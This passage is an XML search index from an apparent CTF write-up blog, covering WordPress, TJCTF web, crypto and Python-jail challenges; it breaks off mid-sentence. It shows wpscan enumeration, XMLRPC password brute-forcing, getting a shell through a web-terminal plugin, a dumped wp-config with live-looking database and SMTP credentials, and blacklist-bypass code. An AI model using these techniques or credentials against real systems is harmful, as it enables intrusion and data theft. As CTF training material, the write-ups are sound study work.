<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[Nihwk Training CTF - WordPress]]></title>
      <url>/2018/08/22/NIHWK-Write-Up-Wordpress/</url>
      <content type="text"><![CDATA[ChallengeCan you find the flag inside server? http://jordpress.herokuapp.com/[1200 points]Written by LatticeInitial thoughtsI wanted to do some of the training challenges before the actual CTF coming up this week-end. I did some of the easy ones out of boredom and then looked at this WordPress one. What striked me was that it only had 1 solve and still gave a good amount of points compared to the others. I wondered if it was really hard, or if people just weren’t that much into WordPress exploitation. Anyway, I dived in, seeing in this challenge a nice way to spend my evening at the hotel I was staying in.ExploitationHere we are. A home page with some articles, unfortunately half-written in a language I do not speak.I looked around, tried some common logins at wp-login.php (such as “admin, admin” or “admin, password”…) but nothing worked.I figured I needed to start using tools, so I fired up Kali and went for WPSCAN.wpscan --url http://jordpress.herokuapp.com/ and wpscan --url http://jordpress.herokuapp.com/ --enumerate p didn’t gave me much. WordPress’ version was outdated, so a bunch of CVEs poped out, one for getting RCE. I tried it, no luck : it failed.I decided to go back to WPSCAN and try something different, a little easier than exploiting a CVE, and see what I could get.Since I do not speak mandarin, chinese or whatever this was, I couldn’t really read posts and see what was said and who posted it. So I asked my bilingual friend WPSCAN to do it for me by enumerating users :wpscan --url http://jordpress.herokuapp.com/ --enumerate u[+] Enumerating usernames ...[+] Identified the following 1 user/s:    +----+-------+---------+    | Id | Login | Name    |    +----+-------+---------+    | 1  | admin | 404 Not |    +----+-------+---------+[!] Default first WordPress username 'admin' is still usedThat’s a start. “admin” is still in use, and seems to be the only one… I guess that shall be the entry point.Let’s see if we can do something dumb, by bruteforcing the log-in, since XMLRPC was available :[+] Starting the password brute forcer  [+] [SUCCESS] Login : admin Password : 12345678                                                                                                                          Brute Forcing 'admin' Time: 00:00:23  +----+-------+------+----------+  | Id | Login | Name | Password |  +----+-------+------+----------+  |    | admin |      | 12345678 |  +----+-------+------+----------+Meeeh. Easier than I thought for this much points. But maybe I’m not done yet. Let’s log-in as admin and see what’s what.Once logged in, I saw some plugins being installed but they were all up to date and not really exploitable (akismet…).I started thinking about exploits that needed authentication as admin to get RCE, but then I remembered : this WordPress installation, unlike all the other ones I did on HackTheBox, was indeed connected to the world wide web.I could just go for plugins’ shopping.Searching for “shell”, I found this nice little guy called WPTerm. I then installed it and was able to get a shell, just like that, on the server as dyno user.(Thanks to Jerome Bruandet for this amazing plugin!)u5412:/app $ iduid=5412(u5412) gid=5412(dyno) groups=5412(dyno)Now comes the stupid part. I was so familiar with HTB’s kind of WordPress exploitation that I didn’t even thought about take a breath after I landed that shell.I immediately started looking into wp-config.php to gather some credentials.&lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to "wp-config.php" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define('DB_NAME', 'ado77oc5a8ntg8qf');/** MySQL database username */define('DB_USER', 'b7gqhve5j2viqqwd');/** MySQL database password */define('DB_PASSWORD', 'eyekawepi48wol7h');/** MySQL hostname */define('DB_HOST', 'y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com');/** Database Charset to use in creating database tables. */define('DB_CHARSET', 'utf8');/** The Database Collate type. Don't change this if in doubt. */define('DB_COLLATE', '');define('WPMS_ON', true);define('WPMS_SMTP_PASS', 'Ynnhoj!@34');/**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */define('AUTH_KEY',         'put your unique phrase here');define('SECURE_AUTH_KEY',  'put your unique phrase here');define('LOGGED_IN_KEY',    'put your unique phrase here');define('NONCE_KEY',        'put your unique phrase here');define('AUTH_SALT',        'put your unique phrase here');define('SECURE_AUTH_SALT', 'put your unique phrase here');define('LOGGED_IN_SALT',   'put your unique phrase here');define('NONCE_SALT',       'put your unique phrase here');/**#@-*//** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */$table_prefix  = 'wp_';/** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the Codex. * * @link https://codex.wordpress.org/Debugging_in_WordPress */define('WP_DEBUG', false);/* That's all, stop editing! Happy blogging. *//** Absolute path to the WordPress directory. */if ( !defined('ABSPATH') )    define('ABSPATH', dirname(__FILE__) . '/');/** Sets up WordPress vars and included files. */require_once(ABSPATH . 'wp-settings.php');And I got excited. I thought “that’s it, the flag must be inside the MySQL db, or then it must have something to do with the WPMS_SMTP_PASS”. Oh boi, was I overthinking this.Anyway, I connected to the remote MySQL DB and started looking.~# mysql -u b7gqhve5j2viqqwd -p -h y06qcehxdtkegbeb.cbetxkdyhwsb.us-east-1.rds.amazonaws.com -D ado77oc5a8ntg8qfEnter password: Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -AWelcome to the MariaDB monitor.  Commands end with ; or \g.Your MySQL connection id is 6144783Server version: 5.7.19-log MySQL Community Server (GPL)Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MySQL [ado77oc5a8ntg8qf]&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || ado77oc5a8ntg8qf   |+--------------------+2 rows in set (0.16 sec)MySQL [ado77oc5a8ntg8qf]&gt; use ado77oc5a8ntg8qf;Database changedMySQL [ado77oc5a8ntg8qf]&gt; show tables;+----------------------------+| Tables_in_ado77oc5a8ntg8qf |+----------------------------+| wp_bp_activity             || wp_bp_activity_meta        || wp_bp_notifications        || wp_bp_notifications_meta   || wp_bp_xprofile_data        || wp_bp_xprofile_fields      || wp_bp_xprofile_groups      || wp_bp_xprofile_meta        || wp_commentmeta             || wp_comments                || wp_links                   || wp_options                 || wp_postmeta                || wp_posts                   || wp_signups                 || wp_term_relationships      || wp_term_taxonomy           || wp_termmeta                || wp_terms                   || wp_usermeta                || wp_users                   || wp_xyz_ips_short_code      |+----------------------------+22 rows in set (0.13 sec)MySQL [ado77oc5a8ntg8qf]&gt;And I looked, and I looked, and I looked… It looked at posts revisions, at users deletions, at posts’ meta… Nothing to be found.I went and looked around in /etc. I looked at ssh configuration. I looked at cronjobs. I looked at passwd, I tried some dumb shit like sudoing stuff.I started to think about the SMTP password then.Hopefully, I had a full bladder by then and had to take a weewee break. While my bladder was unloading itself, I got time to think.And then I saw the light.Wait a minute... I didn't even fucking look around! As soon as I landed this shell, I started doing wp-config.php and MySQL enumeration without even doing a proper ls -al in the landing dir!Long story short, there was indeed a stupid dir in /app, with the flag in it.u5412:/app/123213fda9fd7a089fd8afdsafdsaffdafda $ cat flagflag{wordpress_1s_vulnerable!!!!!!!}Flag was : flag{wordpress_1s_vulnerable!!!!!!!}After thoughtsBefore starting to overthink a challenge, ALWAYS go with the basics. Always assume the actions you need to take in order to get the flag are dumb. If nothing dumb works, you can start thinking.All in all, it’s an interesting, even if basic, WordPress exploitation challenge. I was amazed to see that we were only 2 guys to have solved it, when other web challenges, which gave much more points, had so many more solves.I guess, as I said earlier, that people are just not into WordPress’ exploitation anymore. :smile:]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> nihwk-training-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
          <tag> wordpress </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Central Saving Account]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Central-Saving-Account/</url>
      <content type="text"><![CDATA[ChallengeI seem to have forgotten the password for my savings account. What am I gonna do?The flag is not in standard flag format.[10 points]Written by evanyeyeyeInitial thoughtsA single password input, uh. This could go multiple different ways. Obviously not bruteforce, because it was a web-shared challenge… Let’s find out!ExploitationLet’s take a peek at the source code, shall we?12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;  &lt;title&gt;Central Savings Account&lt;/title&gt;  &lt;meta charset="utf-8"&gt;  &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;  &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous"&gt;&lt;/head&gt;&lt;body&gt;  &lt;div class="container-fluid" style="padding-top: 100px; width: 60%; max-width: 500px"&gt;    &lt;h1&gt;Central Savings Account&lt;/h1&gt;    &lt;h3&gt;Please login to proceed&lt;/h3&gt;    &lt;form id="login-form"&gt;      &lt;div class="form-group"&gt;        &lt;input type="password" class="form-control" id="password" placeholder="Password"&gt;      &lt;/div&gt;      &lt;button type="submit" class="btn btn-primary"&gt;Log In&lt;/button&gt;    &lt;/form&gt;  &lt;/div&gt;  &lt;script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"&gt;&lt;/script&gt;  &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"&gt;&lt;/script&gt;  &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"&gt;&lt;/script&gt;  &lt;script src="/static/main.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;Nothing much here. Let’s go through the javascript and look for an easy CTRL + F. I’ll start with main.js because the other scripts seem to be standard ones.123456789$(document).ready(function() {    $("#login-form").submit(function() {        if (md5($("#password").val()).toLowerCase() === "698967f805dea9ea073d188d73ab7390") {            $("html").html("&lt;h1&gt;Login Succeeded!&lt;/h1&gt;");        }        else {            $("html").html("&lt;h1&gt;Login Failed!&lt;/h1&gt;");        }    })Look at what I found, waiting for us at the bottom of the script! Thanks, CTRL + F “pass”! :smile:We now have a md5 hash.698967f805dea9ea073d188d73ab7390Let’s just paste it on Hashtoolkit and get our flag.Flag : tjctf{avalon}After thoughtsKinda basic, still enjoyable.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - RC4 took an L]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-RC4-took-an-L/</url>
      <content type="text"><![CDATA[ChallengeAlphabet: #_23456789abcdefghijklmnopqrstuvwxyzKey: pq_xc589r3nb#mgjtkh7w2dlfvy4eaoi6uzsCiphertext: wpwt#5ng4_qbitp#8mq59r_g866c4t59c6vy6tisj4af6bprfnbd_wrq2wjmr4ld_s26a7i#biiyqjolq8lus_wfusfkj8xv2qrrv3etab_marovc#uuoueyl[40 points]Written by evanyeyeyeInitial thoughtsRC4 isn’t new to me. I already had a few challenges about this encryption cipher. What bugged me is the “took an L” part, but I found out why pretty quickly (and luckily).ExploitationI really thought this wasn’t “classic RC4” so I didn’t bother trying to decipher it that way. I started google’ing immediately. And what I found by google’ing the alphabet used for the encryption got me where I needed to be : it was LC4, not RC4.From here, it was pretty straight forward. Let’s first install the LC4 lib for Python (because Python &gt; all of course).~# pip install lc4Collecting lc4  Downloading https://files.pythonhosted.org/packages/84/41/d7aeb7fe68b7aef2bb6a8dfce3b158ffee9440acf87e3ffbd13d75395991/lc4-0.1.6.tar.gzRequirement already satisfied: numpy in /usr/lib/python2.7/dist-packages (from lc4)Building wheels for collected packages: lc4  Running setup.py bdist_wheel for lc4 ... done  Stored in directory: /root/.cache/pip/wheels/8a/87/08/c1dca3b084636fed4c03040599ed6d7bfda70a20938b448b00Successfully built lc4Installing collected packages: lc4Successfully installed lc4-0.1.6Let’s then simply decrypt the flag out…:~# pythonPython 2.7.14+ (default, Mar 13 2018, 15:23:44) [GCC 7.3.0] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import lc4&gt;&gt;&gt; key = "pq_xc589r3nb#mgjtkh7w2dlfvy4eaoi6uzs"&gt;&gt;&gt; enc = "wpwt#5ng4_qbitp#8mq59r_g866c4t59c6vy6tisj4af6bprfnbd_wrq2wjmr4ld_s26a7i#biiyqjolq8lus_wfusfkj8xv2qrrv3etab_marovc#uuoueyl"&gt;&gt;&gt; print("Flag : " + lc4.decrypt(key, enc))Flag : i_hope_that_by_making_this_long_you_will_assume_substitution_cipher_and_go_to_quip_qiup_the_flag_is#elsie_four_is_not_rc4Booya! And the flag is : tjctf{elsie_four_is_not_rc4}After thoughtsI could’ve spend hours trying to figure this challenge out, writing python scripts, looking web-pages… But I got lucky and googled first the string I needed to google. All in all, this challenge took me at most ten minutes, where it could have taken me hours if I didn’t have this hunch about the alphabet. Pretty fun though!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> crypto </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Ess Kyoo Ell]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Ess-Kyoo-Ell/</url>
      <content type="text"><![CDATA[ChallengeFind the IP address of the admin user! (flag is tjctf{[ip]})[40 points]Written by okulkarniInitial thoughtsThat challenge name is pretty obvious : we’re going to have to exploit some poorly configured SQL.ExploitationWe are presented with a quite simple login page. Let’s try some things! I will see what email=a@a.a and password=1 give me.Uh. Interesting. The script is made so that we can get any error message (or anything else) SQL returns. This should be easy to exploit.Let’s switch to curl, shall we?~# curl --data "email=a@a.a&amp;&amp;password=1" https://ess-kyoo-ell.tjctf.org/ | grep database  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  7603    0  7580  100    23  17710     53 --:--:-- --:--:-- --:--:-- 17764            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: no such column: password&lt;/p&gt;Thanks to grep, we got the line that matters. Now let’s try some basic SQL column’s name instead of the given parameters email &amp;&amp; password.~# curl --data "id=1" https://ess-kyoo-ell.tjctf.org/ | grep database  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  8076    0  8072  100     4  20383     10 --:--:-- --:--:-- --:--:-- 20445            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: {&amp;#39;id&amp;#39;: 1, &amp;#39;username&amp;#39;: &amp;#39;hdavidovsky0&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Hamnet&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;Davidovsky&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;&lt;a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e48c8085928d808b92978f9dd4a4978885978c808b90ca8b9683"&gt;[email&amp;#160;protected]&lt;/a&gt;&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Male&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;202.100.56.108&amp;#39;}&lt;/p&gt;Uh, uh! Seems like we got a hit! Pretty easily nevertheless. Well, now we know that it will return any column value we ask for, aaaand… We know all the columns ids. Since we need to retrieve the administrator’s IP address, let’s ask for his column!~# curl --data "username=admin" https://ess-kyoo-ell.tjctf.org/ | grep database  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  8086    0  8072  100    14  16746     29 --:--:-- --:--:-- --:--:-- 16775            &lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: {&amp;#39;id&amp;#39;: 706, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;first_name&amp;#39;: &amp;#39;Administrative&amp;#39;, &amp;#39;last_name&amp;#39;: &amp;#39;User&amp;#39;, &amp;#39;email&amp;#39;: &amp;#39;&lt;a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="187c7d7e3576776c356c702b35797c752976586c727b6c7e36776a7f"&gt;[email&amp;#160;protected]&lt;/a&gt;&amp;#39;, &amp;#39;gender&amp;#39;: &amp;#39;Female&amp;#39;, &amp;#39;ip_address&amp;#39;: &amp;#39;145.3.1.213&amp;#39;}&lt;/p&gt;Well, well, well… Here it is! Flag is : tjctf{145.3.1.213}After thoughtsA pretty basic web challenge to be honest but still refreshing and nice to complete. I already had encountered such challenges in the past but it took me a little while to get back to it and figure it out, so… All in all, it was worth it!]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Blank]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Blank/</url>
      <content type="text"><![CDATA[ChallengeSomeone told me there was a flag on this site, so why is it that I can only see blank?[5 points]Written by evanyeyeyeInitial thoughtsNot much.Exploitation12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;Blank&lt;/title&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;&lt;style type="text/css"&gt;p {position: absolute;top: 35%;left: 50%;transform: translate(-50%, -50%);font-size: 100px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;『　　』&lt;/p&gt;&lt;!-- flag: tjctf{50urc3_c0d3_n3v3r_l0535} --&gt;&lt;/body&gt;&lt;/html&gt;After thoughtsErr… Not much.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Cookie Monster]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Cookie-Monster/</url>
      <content type="text"><![CDATA[ChallengeThe Cookie Monster is not a fan of horses[10 points]Written by okulkarniInitial thoughtsLet’s look at cookies.ExploitationFlag : tjctf{c00ki3s_over_h0rs3s}After thoughtsErr… Not much.]]></content>
      <categories>
        
      </categories>
      <tags>
        
          <tag> tjctf-2018 </tag>
        
          <tag> write-up </tag>
        
          <tag> web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[TJCTF - Mirror Mirror]]></title>
      <url>/2018/08/12/TJCTF-Write-Up-Mirror-Mirror/</url>
      <content type="text"><![CDATA[ChallengeIf you look closely, you can see a reflection.nc problem1.tjctf.org 8004[100 points]Written by Alaska47Initial thoughts# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; …To be really honest here, this was my first pyjail. Ever. I had never heard of this kind of challenge before. I knew about “bash jail” or whatever ; but didn’t know it was a thing.Took me a lot of googling, trying stupid shit like “python console exploit” or “python console enum”, and I couldn’t find nothing. Hopefully, a good man called Highsenburger69 told me “it’s a pyjail” and sent me this link. Game on.ExploitationAt first, I needed to do a little bit of enumeration. I started by trying random crap.# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; get_flag("flag")f is not a valid character&gt;&gt;&gt; get_flag("()")You didn't guess the value of my super_secret_stringUh. So apparently, some characters aren’t allowed. Most likely, letters and numbers. Aaaaaand there seems to be a “super secret string” that should give me the flag.Using some commands, I then managed to find something interesting :# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; dir&lt;built-in function dir&gt;&gt;&gt;&gt; dir(get_flag)['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']&gt;&gt;&gt; dir(get_flag.func_code)['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']&gt;&gt;&gt; get_flag.func_code&lt;code object get_flag at 0x7f9f8fc644b0, file "/home/app/problem.py", line 15&gt;&gt;&gt;&gt; get_flag.func_code.co_consts(None, 'this_is_the_super_secret_string', 48, 57, 65, 90, 97, 122, 44, 95, ' is not a valid character', '%\xcb', "You didn't guess the value of my super_secret_string")Yey! I got it! Pretty easy for that much points. Anyway, the value of the super secret string is : this_is_the_super_secret_stringLet’s type it in and get our flag!&gt;&gt;&gt; get_flag("this_is_the_super_secret_string")Sorry, that's not allowed.Fuck me. I forgot some characters aren’t allowed. If you look at the previous snippet, you’ll see, next to the super secret string value, some numbers : 48, 57, 65, 90, 97, 122, 44, 95. Ascii codes for 0-9, A-Z, a-z, “,”-“_”. Those must be the forbidden characters.That’s where Highsenburger69’s link comes in handy. I can see that Wapiflapi managed to generate letters and numbers using special chars, abusing logical relations between True and False values.The interesting part was this :123456789def brainfuckize(nb):    if nb in [-2, -1, 0, 1]:        return ["~({}&lt;[])", "~([]&lt;[])",                 "([]&lt;[])",  "({}&lt;[])"][nb+2]    if nb % 2:        return "~%s" % brainfuckize(~nb)    else:        return "(%s&lt;&lt;({}&lt;[]))" % brainfuckize(nb/2)Seems amazing, kind of magic, but works! He even put an example a little below, so I tried it to understand exactly what was going on.Python 2.7.14+ (default, Mar 13 2018, 15:23:44) [GCC 7.3.0] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; `[`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[])))]`[(({}&lt;[])&lt;&lt;({}&lt;[]))::~(~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))]'The game is on.'Holy cow, that’s impressive!I noticed that he used “,” to separate each character in his code, and kept in mind for later that I would have to use “+” instead because “,” was forbidden in this challenge.I then started to write my own code, with one goal in mind : being able to reproduce what he was doing, using part of his code, to recreate my very much needed super secret key.123456789101112131415161718192021def brainfuckize(nb):    if nb in [-2, -1, 0, 1]:        return ["~({}&lt;[])", "~([]&lt;[])",                 "([]&lt;[])",  "({}&lt;[])"][nb+2]    if nb % 2:        return "~%s" % brainfuckize(~nb)    else:        return "(%s&lt;&lt;({}&lt;[]))" % brainfuckize(nb/2)import syssecret = str(sys.argv[1])addendum = "`'%\\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%"solution = ''for i in range (len(secret)):	temp = ord(secret[i])	solution = solution + addendum + brainfuckize(temp) + "+"print solution[:-1]This is actually a very simple piece of code once you understand it right. I’m slicing the last “+” at the end before printing, for those of you who wondered.Let’s try it out!# python func.py "Am I good to 